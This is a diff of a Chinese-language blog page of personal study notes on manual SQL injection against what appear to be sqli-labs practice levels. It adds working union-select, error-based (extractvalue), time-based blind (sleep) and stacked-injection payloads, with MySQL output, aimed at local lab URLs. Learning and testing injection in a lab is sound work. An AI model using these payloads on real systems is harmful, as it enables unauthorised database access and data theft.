@@ -81,12 +81,12 @@
 
 
 
-<meta name="description" content="[toc] 第一步判断输入类型#$_REQUEST $_COOKIE  可以用cookie注入 空格要用16进制 第二步判断注入点 and 和 or 的理解 and的使用 当判断有没有注入点时，可以用and 1=1 1=2来判断 or的使用 select * from user where id =’’ or 1=1#     当直接把前面闭合时，条件永远为假，所以用or 注意绕过 ‘$id’ 单">
+<meta name="description" content="[toc] 第一步判断输入类型#‘1’=‘1和#注释的区别是 ‘1’=‘1不会注释掉语句后面的内容 http:&#x2F;&#x2F;192.168.100.134&#x2F;sql&#x2F;Less-19&#x2F;&amp;#39;and  (select extractvalue(1,concat(‘~’,@@version))) and ‘1’=’1 @@为sql系统变量 @@version 版本号 @@basedir 数据库安装位置 $_RE">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sql手工注入">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;24&#x2F;sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5&#x2F;index.html">
 <meta property="og:site_name" content="waiwailo&#x2F;blog">
-<meta property="og:description" content="[toc] 第一步判断输入类型#$_REQUEST $_COOKIE  可以用cookie注入 空格要用16进制 第二步判断注入点 and 和 or 的理解 and的使用 当判断有没有注入点时，可以用and 1=1 1=2来判断 or的使用 select * from user where id =’’ or 1=1#     当直接把前面闭合时，条件永远为假，所以用or 注意绕过 ‘$id’ 单">
+<meta property="og:description" content="[toc] 第一步判断输入类型#‘1’=‘1和#注释的区别是 ‘1’=‘1不会注释掉语句后面的内容 http:&#x2F;&#x2F;192.168.100.134&#x2F;sql&#x2F;Less-19&#x2F;&amp;#39;and  (select extractvalue(1,concat(‘~’,@@version))) and ‘1’=’1 @@为sql系统变量 @@version 版本号 @@basedir 数据库安装位置 $_RE">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="c:&#x2F;Users&#x2F;wai-wai&#x2F;AppData&#x2F;Local&#x2F;YNote&#x2F;data&#x2F;qq4EF61E8A5E69F04C63CDAC03394D9979&#x2F;578be440399e4219a9518c89d8431ac1&#x2F;cbd890e837b7d5b75f78d7af814362ed.jpg">
 <meta property="og:image" content="c:&#x2F;Users&#x2F;wai-wai&#x2F;AppData&#x2F;Local&#x2F;YNote&#x2F;data&#x2F;qq4EF61E8A5E69F04C63CDAC03394D9979&#x2F;d635deafb40041ee985d876d1bb71dba&#x2F;e1d239263762b769be93c1d455c704d9.jpg">
@@ -97,7 +97,7 @@
 <meta property="og:image" content="c:&#x2F;Users&#x2F;wai-wai&#x2F;AppData&#x2F;Local&#x2F;YNote&#x2F;data&#x2F;qq4EF61E8A5E69F04C63CDAC03394D9979&#x2F;61be0dc6b8f748e797a47241c6db9c9e&#x2F;efb6e80b721f725981aedeb98f49d888.jpg">
 <meta property="og:image" content="c:&#x2F;Users&#x2F;wai-wai&#x2F;AppData&#x2F;Local&#x2F;YNote&#x2F;data&#x2F;qq4EF61E8A5E69F04C63CDAC03394D9979&#x2F;9c34adb97fd24630beb944c330483a5b&#x2F;clipboard.png">
 <meta property="og:image" content="c:&#x2F;Users&#x2F;wai-wai&#x2F;AppData&#x2F;Local&#x2F;YNote&#x2F;data&#x2F;qq4EF61E8A5E69F04C63CDAC03394D9979&#x2F;572314954ddd4d3f86f7572f075e126e&#x2F;clipboard.png">
-<meta property="og:updated_time" content="2019-11-25T17:46:48.527Z">
+<meta property="og:updated_time" content="2019-11-26T08:03:13.990Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="c:&#x2F;Users&#x2F;wai-wai&#x2F;AppData&#x2F;Local&#x2F;YNote&#x2F;data&#x2F;qq4EF61E8A5E69F04C63CDAC03394D9979&#x2F;578be440399e4219a9518c89d8431ac1&#x2F;cbd890e837b7d5b75f78d7af814362ed.jpg">
 
@@ -310,8 +310,12 @@
 
       
         <p>[toc]</p>
-<h2><span id="di-yi-bu-pan-duan-shu-ru-lei-xing">第一步判断输入类型</span><a href="#di-yi-bu-pan-duan-shu-ru-lei-xing" class="header-anchor">#</a></h2><p><a href="http://www.baidu.com/link?url=DzjcovztPSNVH3IE4L1KTR7X3ajFa9pI5iHMU07TjalYt5i6MW9f0rxDtClFUwsLQbouUd0EXcKCN36Um1TPSa" target="_blank" rel="noopener">$_REQUEST</a> $_COOKIE </p>
-<p>可以用cookie注入 空格要用16进制</p>
+<h2><span id="di-yi-bu-pan-duan-shu-ru-lei-xing">第一步判断输入类型</span><a href="#di-yi-bu-pan-duan-shu-ru-lei-xing" class="header-anchor">#</a></h2><p>‘1’=‘1和#注释的区别是 ‘1’=‘1不会注释掉语句后面的内容</p>
+<p><a href="http://192.168.100.134/sql/Less-19/&#39;and" target="_blank" rel="noopener">http://192.168.100.134/sql/Less-19/&#39;and</a>  (select extractvalue(1,concat(‘~’,@@version))) and ‘1’=’1</p>
+<p>@@为sql系统变量</p>
+<p>@@version 版本号</p>
+<p>@@basedir 数据库安装位置</p>
+<p><a href="http://www.baidu.com/link?url=DzjcovztPSNVH3IE4L1KTR7X3ajFa9pI5iHMU07TjalYt5i6MW9f0rxDtClFUwsLQbouUd0EXcKCN36Um1TPSa" target="_blank" rel="noopener">$_REQUEST</a> $_COOKIE </p>
 <p>第二步判断注入点</p>
 <p>and 和 or 的理解</p>
 <p>and的使用</p>
@@ -329,7 +333,10 @@
 <p><img src="C:/Users/wai-wai/AppData/Local/YNote/data/qq4EF61E8A5E69F04C63CDAC03394D9979/d635deafb40041ee985d876d1bb71dba/e1d239263762b769be93c1d455c704d9.jpg" alt="img"></p>
 <p>搜索型 like ‘%%’ 先闭合前面 与字符型同理</p>
 <p><img src="C:/Users/wai-wai/AppData/Local/YNote/data/qq4EF61E8A5E69F04C63CDAC03394D9979/fa6b4af82eae4bfab232c3e2aa0dd6b6/70da0cf01873c9dc8380dad68256a23d.jpg" alt="img"></p>
-<p>oeder by 3是指对第三列进行排序，如果没有第三列就会报错，用他来判断列大小</p>
+<h2><span id="union-select">union select</span><a href="#union-select" class="header-anchor">#</a></h2><p>update语句不能用union select</p>
+<p>select 语句可以用union select </p>
+<p>mysql&gt; <u>select table_name,table_schema from tables</u> union select 1,2;<br>+———————————————-+——————–+<br>| table_name                                   | table_schema       |<br>+———————————————-+——————–+<br>| CHARACTER_SETS                               | information_schema |<br>| COLLATIONS                                   | information_schema |<br>| COLLATION_CHARACTER_SET_APPLICABILITY        | information_schema |<br>………………………………….<br>| func                                         | mysql              |<br>| 1                                            | 2                  |</p>
+<p>mysql&gt; <em>select table_name,table_schema from tables where table_name= ‘aaa’</em> union select 1,2;<br>+————+————–+<br>| table_name | table_schema |<br>+————+————–+<br>| aaa        | test         |<br>| 1          | 2            |</p>
 <h2><span id="kuan-zi-jie-zhu-ru">宽字节注入</span><a href="#kuan-zi-jie-zhu-ru" class="header-anchor">#</a></h2><p>gb2312 易想到宽字节注入但和页面编码无关</p>
 <p><img src="C:/Users/wai-wai/AppData/Local/YNote/data/qq4EF61E8A5E69F04C63CDAC03394D9979/f2b016a1135442d09f13fdb678eaeb5e/0d98ba236ef87fd2b753a98a9d1bdbca.jpg" alt="img"></p>
 <p><img src="C:/Users/wai-wai/AppData/Local/YNote/data/qq4EF61E8A5E69F04C63CDAC03394D9979/bc9e4db1bc364e6aa0e3cdc8115c9005/aca94ac1ee07f8a361f1a990a26b8c11.jpg" alt="img"></p>
@@ -411,6 +418,14 @@
 <p><a href="http://localhost/sql/Less-9/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sql/Less-9/?id=1&#39;</a> and if (length(database()=8) ,sleep(4),1)–+  判断数据库长度</p>
 <p><a href="http://localhost/sql/Less-9/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sql/Less-9/?id=1&#39;</a> and if (ascii(substr(database(),1,1)) &gt;100 ,sleep(4),1)–+判断数据库名第一个字母的ascii   </p>
 <p>后面过程参照上面布尔盲注过程</p>
+<h2><span id="shi-jian-mang-zhu-bu-er-mang-zhu-bao-cuo-zhu-ru-de-and-or-ji-qiao">时间盲注、布尔盲注、报错注入     的and or 技巧</span><a href="#shi-jian-mang-zhu-bu-er-mang-zhu-bao-cuo-zhu-ru-de-and-or-ji-qiao" class="header-anchor">#</a></h2><h4><span id="and-or-select">and/or + select</span><a href="#and-or-select" class="header-anchor">#</a></h4><p>mysql&gt; update user set username = 1 and <u>(select id from aaa)</u> where id = 1;  </p>
+<p>Query OK, 0 rows affected (0.00 sec) ////and后面的select语句没有where字句或者limit 字句不会报错</p>
+<p>mysql&gt; update user set username = 1 and (<u>select id from user where id = 1</u>) where id = 1;<br>ERROR 1093 (HY000): You can’t specify target table ‘user’ for update in FROM clause/////// and后面的select语句有where 或 limit字句时 select的结果是一个筛选表 不能和and/or作比较，需要在前面加上select 1 from   具体如下:</p>
+<p>mysql&gt; update user set username = 1 and <u>(select 1 from(select id from user where id = 1)as a)</u> where id = 1;<br>Query OK, 0 rows affected (0.00 sec)</p>
+<h4><span id="and-or-bao-cuo-yu-ju-if-sleep">and/or + 报错语句/if sleep()</span><a href="#and-or-bao-cuo-yu-ju-if-sleep" class="header-anchor">#</a></h4><p>报错语句：</p>
+<p>mysql&gt; update user set username = 1 and (select extractvalue(1,concat(‘<del>‘,@@version))) where id = 1;<br>ERROR 1105 (HY000): XPATH syntax error: ‘</del>5.5.53’</p>
+<p>sleep语句：</p>
+<p>mysql&gt; update user set username = 1 and if(1=1,sleep(4),1) where id = 1;<br>Query OK, 1 row affected (4.01 sec)</p>
 <h2><span id="dui-die-zhu-ru">堆叠注入</span><a href="#dui-die-zhu-ru" class="header-anchor">#</a></h2><p>?id=1;update users set username = ‘ww’ where id =1 用分号隔断前面的语句再后面执行任意的sql语句</p>
 
       
@@ -446,8 +461,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/11/25/hexo%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/" rel="prev" title="hexo搭建教程">
-                hexo搭建教程 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/11/25/hexo%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8Bcgd/" rel="prev" title="hexo搭建教程cgd">
+                hexo搭建教程cgd <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -525,7 +540,7 @@
               
                 <a href="/archives/%20%7C%7C%20archive">
               
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -569,7 +584,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">1.</span> <span class="nav-text">第一步判断输入类型#</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">2.</span> <span class="nav-text">宽字节注入#</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">2.0.1.</span> <span class="nav-text">group_concat  可以把同一列的值放在一起显示#</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">3.</span> <span class="nav-text">报错注入#</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">3.0.1.</span> <span class="nav-text">一、extractvalue函数#</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">3.0.2.</span> <span class="nav-text">二、floor#</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">4.</span> <span class="nav-text">布尔盲注#</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">5.</span> <span class="nav-text">时间盲注#</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">6.</span> <span class="nav-text">堆叠注入#</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">1.</span> <span class="nav-text">第一步判断输入类型#</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">2.</span> <span class="nav-text">union select#</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">3.</span> <span class="nav-text">宽字节注入#</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">3.0.1.</span> <span class="nav-text">group_concat  可以把同一列的值放在一起显示#</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">4.</span> <span class="nav-text">报错注入#</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">4.0.1.</span> <span class="nav-text">一、extractvalue函数#</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">4.0.2.</span> <span class="nav-text">二、floor#</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">5.</span> <span class="nav-text">布尔盲注#</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">6.</span> <span class="nav-text">时间盲注#</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">7.</span> <span class="nav-text">时间盲注、布尔盲注、报错注入     的and or 技巧#</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">7.0.1.</span> <span class="nav-text">and/or + select#</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">7.0.2.</span> <span class="nav-text">and/or + 报错语句/if sleep()#</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">8.</span> <span class="nav-text">堆叠注入#</span></a></li></ol></div>
             
 
           </div>
